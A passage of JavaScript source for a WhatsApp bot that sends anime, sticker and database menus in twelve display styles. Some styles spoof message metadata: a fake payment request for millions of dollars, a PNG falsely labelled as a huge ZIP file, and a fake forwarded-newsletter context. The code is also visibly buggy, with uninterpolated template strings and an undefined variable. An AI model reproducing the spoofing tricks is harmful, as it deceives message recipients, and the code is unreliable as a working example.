          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_anime': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_sticker': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_database': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
